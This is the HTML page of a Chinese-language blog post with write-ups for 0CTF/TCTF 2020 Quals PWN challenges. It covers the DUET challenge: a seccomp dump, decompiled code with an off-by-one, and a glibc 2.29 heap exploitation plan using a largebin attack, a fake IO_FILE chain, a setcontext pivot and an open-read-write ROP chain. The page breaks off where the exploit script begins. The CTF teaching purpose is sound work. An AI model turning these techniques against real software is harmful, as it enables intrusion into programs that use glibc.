<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="referrer" content="no-referrer" />
    <meta name="description" content="感觉比去年好一些自己解决了三道PWN，成功一血  DUETlibc-2.29 程序使用calloc分配heap，只能同时有两个chunk，分配大小：0x80～0x400程序开启了sandbox: 12345678910111213141516171819202122232425262728293031kirin@ubuntu:~&#x2F;tctf$ seccomp-tools dump .&amp;#x">
<meta property="og:type" content="article">
<meta property="og:title" content="0CTF&#x2F;TCTF 2020 Quals PWN">
<meta property="og:url" content="http://yoursite.com/2020/06/29/0CTF-TCTF-2020-Quals-PWN/index.html">
<meta property="og:site_name" content="Kirin&#39;s Blog">
<meta property="og:description" content="感觉比去年好一些自己解决了三道PWN，成功一血  DUETlibc-2.29 程序使用calloc分配heap，只能同时有两个chunk，分配大小：0x80～0x400程序开启了sandbox: 12345678910111213141516171819202122232425262728293031kirin@ubuntu:~&#x2F;tctf$ seccomp-tools dump .&amp;#x">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-02fdffb7b08b3550.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="article:published_time" content="2020-06-29T05:26:05.000Z">
<meta property="article:modified_time" content="2020-06-30T13:36:51.338Z">
<meta property="article:author" content="Kirin">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/7434375-02fdffb7b08b3550.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
    
    
        
          
              <link rel="shortcut icon" href="/images/logo.jpg">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/logo.jpg" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.jpg">
          
        
    
    <!-- title -->
    <title>0CTF/TCTF 2020 Quals PWN</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/CTF-Writeups/">CTF-Writeups</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020/08/28/QWB-2020-Quals-the-End-of-CTF-Write-up-in-Kirin-s-Blog/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2020/06/11/Windows-Kernel-Bypass-Protection-Run-Shellcode/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/06/29/0CTF-TCTF-2020-Quals-PWN/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/06/29/0CTF-TCTF-2020-Quals-PWN/&text=0CTF/TCTF 2020 Quals PWN" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/06/29/0CTF-TCTF-2020-Quals-PWN/&title=0CTF/TCTF 2020 Quals PWN" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/06/29/0CTF-TCTF-2020-Quals-PWN/&is_video=false&description=0CTF/TCTF 2020 Quals PWN" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=0CTF/TCTF 2020 Quals PWN&body=Check out this article: http://yoursite.com/2020/06/29/0CTF-TCTF-2020-Quals-PWN/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/06/29/0CTF-TCTF-2020-Quals-PWN/&title=0CTF/TCTF 2020 Quals PWN" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/06/29/0CTF-TCTF-2020-Quals-PWN/&title=0CTF/TCTF 2020 Quals PWN" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/06/29/0CTF-TCTF-2020-Quals-PWN/&title=0CTF/TCTF 2020 Quals PWN" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/06/29/0CTF-TCTF-2020-Quals-PWN/&title=0CTF/TCTF 2020 Quals PWN" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/06/29/0CTF-TCTF-2020-Quals-PWN/&name=0CTF/TCTF 2020 Quals PWN&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#DUET"><span class="toc-number">1.</span> <span class="toc-text">DUET</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simple-echoserver"><span class="toc-number">2.</span> <span class="toc-text">simple echoserver</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eeeeeeemoji"><span class="toc-number">3.</span> <span class="toc-text">eeeeeeemoji</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        0CTF/TCTF 2020 Quals PWN
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Kirin's Blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2020-06-29T05:26:05.000Z" itemprop="datePublished">2020-06-29</time>
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>感觉比去年好一些<br>自己解决了三道PWN，成功一血</p>
<p><img src="https://upload-images.jianshu.io/upload_images/7434375-02fdffb7b08b3550.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="emmmm"></p>
<h2 id="DUET"><a href="#DUET" class="headerlink" title="DUET"></a>DUET</h2><p>libc-2.29 程序使用calloc分配heap，只能同时有两个chunk，分配大小：0x80～0x400<br>程序开启了sandbox:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">kirin@ubuntu:~&#x2F;tctf$ seccomp-tools dump .&#x2F;duet </span><br><span class="line">    __ __ _____________   __   __    ___    ____</span><br><span class="line">   &#x2F; &#x2F;&#x2F;_&#x2F;&#x2F; ____&#x2F; ____&#x2F; | &#x2F; &#x2F;  &#x2F; &#x2F;   &#x2F;   |  &#x2F; __ )</span><br><span class="line">  &#x2F; ,&lt;  &#x2F; __&#x2F; &#x2F; __&#x2F; &#x2F;  |&#x2F; &#x2F;  &#x2F; &#x2F;   &#x2F; &#x2F;| | &#x2F; __  |</span><br><span class="line"> &#x2F; &#x2F;| |&#x2F; &#x2F;___&#x2F; &#x2F;___&#x2F; &#x2F;|  &#x2F;  &#x2F; &#x2F;___&#x2F; ___ |&#x2F; &#x2F;_&#x2F; &#x2F;</span><br><span class="line">&#x2F;_&#x2F; |_&#x2F;_____&#x2F;_____&#x2F;_&#x2F; |_&#x2F;  &#x2F;_____&#x2F;_&#x2F;  |_&#x2F;_____&#x2F;</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; DEUT - 琴瑟和鸣 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A &#x3D; arch</span><br><span class="line"> 0001: 0x15 0x00 0x12 0xc000003e  if (A !&#x3D; ARCH_X86_64) goto 0020</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x0f 0xffffffff  if (A !&#x3D; 0xffffffff) goto 0020</span><br><span class="line"> 0005: 0x15 0x0d 0x00 0x00000000  if (A &#x3D;&#x3D; read) goto 0019</span><br><span class="line"> 0006: 0x15 0x0c 0x00 0x00000001  if (A &#x3D;&#x3D; write) goto 0019</span><br><span class="line"> 0007: 0x15 0x0b 0x00 0x00000003  if (A &#x3D;&#x3D; close) goto 0019</span><br><span class="line"> 0008: 0x15 0x0a 0x00 0x00000009  if (A &#x3D;&#x3D; mmap) goto 0019</span><br><span class="line"> 0009: 0x15 0x09 0x00 0x0000000a  if (A &#x3D;&#x3D; mprotect) goto 0019</span><br><span class="line"> 0010: 0x15 0x08 0x00 0x0000000c  if (A &#x3D;&#x3D; brk) goto 0019</span><br><span class="line"> 0011: 0x15 0x07 0x00 0x0000000f  if (A &#x3D;&#x3D; rt_sigreturn) goto 0019</span><br><span class="line"> 0012: 0x15 0x06 0x00 0x0000003c  if (A &#x3D;&#x3D; exit) goto 0019</span><br><span class="line"> 0013: 0x15 0x05 0x00 0x000000e7  if (A &#x3D;&#x3D; exit_group) goto 0019</span><br><span class="line"> 0014: 0x15 0x00 0x05 0x00000002  if (A !&#x3D; open) goto 0020</span><br><span class="line"> 0015: 0x20 0x00 0x00 0x0000001c  A &#x3D; flags &gt;&gt; 32 # open(filename, flags, mode)</span><br><span class="line"> 0016: 0x15 0x00 0x03 0x00000000  if (A !&#x3D; 0x0) goto 0020</span><br><span class="line"> 0017: 0x20 0x00 0x00 0x00000018  A &#x3D; flags # open(filename, flags, mode)</span><br><span class="line"> 0018: 0x15 0x00 0x01 0x00000000  if (A !&#x3D; 0x0) goto 0020</span><br><span class="line"> 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0020: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
<p>拥有一次off-by-one的机会：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __usercall magic@&lt;eax&gt;(__int64 a1@&lt;rbp&gt;, _DWORD *a2@&lt;rdi&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// dl</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v5 = a1;</span><br><span class="line">  <span class="keyword">if</span> ( *a2 != <span class="number">0x13377331</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Amazing thing happens only once."</span>);</span><br><span class="line">  *a2 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="built_in">calloc</span>(<span class="number">0x88</span>uLL, <span class="number">1u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;byte_5555555561EF, <span class="number">1L</span>L);</span><br><span class="line">  v2 = get_num((__int64)&amp;v5);</span><br><span class="line">  result = (_DWORD)v4 + <span class="number">0x88</span>;</span><br><span class="line">  v4[<span class="number">0x88</span>] = v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>思路：</p>
<ul>
<li>calloc不从tcache中分配chunk，先将需要的chunk size对应的tcache bin填满，构造一个0x88字节的unsortedbin，便可以构造overlapping，这样的话布置好堆空间，就可以使得chunk A能够修改chunk B的header(此时利用unsortedbin的fd已经leak libc address)</li>
<li>而后利用largebin attack：先用chunk A修改B的header构造一个0x400大小的堆，而后free B入unsorted bin，分配0x400(chunksize=0x410)，B就会进入largebin，此时可以利用largebin的 fd_nextsize/bk_nextsize 来leak heap address，再次利用A修改B的bk_nextsize到 &amp;ptr-0x20，此时再free一个largebin范围chunk进入unsortedbin，就可以在下次malloc一个小chunk过程中进行largebin attack(原理见源码)，修改ptr到一个堆地址，完成一次任意地址写heap addr</li>
<li>考虑到只有两个chunk，可以通过写global_max_fast来进行一次fastbin attack，但是calloc会置0原空间，没有好的位置用于劫持程序流，且因为libc-2.29存在vtable check，也没办法直接通过largebin attack覆写vtable劫持程序流</li>
<li>考虑直接覆盖掉stderr的chain，在exit调用_IO_flush_all_lockp时尝试劫持程序流<strong>(因为在libc-2.29下_IO_strfile没有了像libc-2.24下的fp-&gt;_s._allocate_buffer()这类函数操作，都被修改为了标准函数(malloc…)，所以没办法直接直接像libc-2.24那样直接劫持程序流)</strong>：</li>
</ul>
<p>因为存在vtable check，所以只能寻找__libc_IO_vtables内的函数，看到：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="keyword">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="keyword">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">	<span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">char</span> *new_buf;</span><br><span class="line">	  <span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">	  <span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">	  <span class="keyword">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">	  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">	    <span class="keyword">return</span> EOF;</span><br><span class="line">	  new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">	  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="comment">/*	  __ferror(fp) = 1; */</span></span><br><span class="line">	      <span class="keyword">return</span> EOF;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">if</span> (old_buf)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">	      <span class="built_in">free</span> (old_buf);</span><br><span class="line">	      <span class="comment">/* Make sure _IO_setb won't try to delete _IO_buf_base. */</span></span><br><span class="line">	      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">'\0'</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">	  _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">	  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">	  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">	  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">	  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">	  fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">	  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里存在malloc、memcpy、free，参数都可以控制<br>所以考虑在这里进行tcache attack：<br>在exit前布置好一条tcache bin：chunk A-&gt;ptr<br>构造好两个IO_FILE: X.chain -&gt; Y<br>这样就可以在_IO_flush_all_lockp时两次进入_IO_str_overflow，第二次的时候调用malloc就会把chunk分配到ptr，而后memcpy，即可进行任意地址写<br>首先考虑malloc_hook/free_hook：<br>修改free_hook，第二次memcpy后free就可以劫持程序流，但是<strong>因为存在sandbox，只能栈迁移利用orw来获得flag</strong>，但是此时寄存器空间没有好的gadget来栈迁移<br>注意到_IO_str_overflow的汇编：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.text:00007FFFF7E73AEB                 mov     rdx, [rdi+28h]</span><br><span class="line">.text:00007FFFF7E73AEF</span><br><span class="line">.text:00007FFFF7E73AEF loc_7FFFF7E73AEF:                       ; CODE XREF: _IO_str_overflow+175↓j</span><br><span class="line">.text:00007FFFF7E73AEF                 mov     r12, [rdi+38h]</span><br><span class="line">.text:00007FFFF7E73AF3                 mov     r15, [rdi+40h]</span><br><span class="line">.text:00007FFFF7E73AF7                 xor     eax, eax</span><br><span class="line">.text:00007FFFF7E73AF9                 mov     ebp, esi</span><br><span class="line">.text:00007FFFF7E73AFB                 mov     rbx, rdi</span><br><span class="line">.text:00007FFFF7E73AFE                 sub     r15, r12</span><br><span class="line">.text:00007FFFF7E73B01                 cmp     esi, 0FFFFFFFFh</span><br><span class="line">.text:00007FFFF7E73B04                 mov     rsi, rdx</span><br><span class="line">.text:00007FFFF7E73B07                 setz    al</span><br><span class="line">.text:00007FFFF7E73B0A                 sub     rsi, [rdi+20h]</span><br><span class="line">.text:00007FFFF7E73B0E                 add     rax, r15</span><br><span class="line">.text:00007FFFF7E73B11                 cmp     rax, rsi</span><br><span class="line">.text:00007FFFF7E73B14                 ja      loc_7FFFF7E73BF0</span><br><span class="line">.text:00007FFFF7E73B1A                 and     ecx, 1</span><br><span class="line">.text:00007FFFF7E73B1D                 jnz     loc_7FFFF7E73C50</span><br><span class="line">.text:00007FFFF7E73B23                 lea     r14, [r15+r15+64h]</span><br><span class="line">.text:00007FFFF7E73B28                 cmp     r15, r14</span><br><span class="line">.text:00007FFFF7E73B2B                 ja      loc_7FFFF7E73C50</span><br><span class="line">.text:00007FFFF7E73B31                 mov     rdi, r14</span><br><span class="line">.text:00007FFFF7E73B34                 call    j_malloc</span><br></pre></td></tr></table></figure>
<p>调用malloc前rdx=[rdi+0x28]，rdi=&amp;fake_IO_FILE,此时rdx可控：<br>所以考虑构造三个fake_IO_FILE,第二个用来修改malloc_hook,第三个用来控制好rdx并利用libc-2.29下的setcontext劫持程序流：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00007FFFF7E36E35                 mov     rsp, [rdx+0A0h]</span><br><span class="line">.text:00007FFFF7E36E3C                 mov     rbx, [rdx+80h]</span><br><span class="line">.text:00007FFFF7E36E43                 mov     rbp, [rdx+78h]</span><br><span class="line">.text:00007FFFF7E36E47                 mov     r12, [rdx+48h]</span><br><span class="line">.text:00007FFFF7E36E4B                 mov     r13, [rdx+50h]</span><br><span class="line">.text:00007FFFF7E36E4F                 mov     r14, [rdx+58h]</span><br><span class="line">.text:00007FFFF7E36E53                 mov     r15, [rdx+60h]</span><br><span class="line">.text:00007FFFF7E36E57                 mov     rcx, [rdx+0A8h]</span><br><span class="line">.text:00007FFFF7E36E5E                 push    rcx</span><br><span class="line">.text:00007FFFF7E36E5F                 mov     rsi, [rdx+70h]</span><br><span class="line">.text:00007FFFF7E36E63                 mov     rdi, [rdx+68h]</span><br><span class="line">.text:00007FFFF7E36E67                 mov     rcx, [rdx+98h]</span><br><span class="line">.text:00007FFFF7E36E6E                 mov     r8, [rdx+28h]</span><br><span class="line">.text:00007FFFF7E36E72                 mov     r9, [rdx+30h]</span><br><span class="line">.text:00007FFFF7E36E76                 mov     rdx, [rdx+88h]</span><br><span class="line">.text:00007FFFF7E36E7D                 xor     eax, eax</span><br><span class="line">.text:00007FFFF7E36E7F                 retn</span><br></pre></td></tr></table></figure>
<p>而后Dockerfile中flag路径已知，ROP进行orw即可：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td 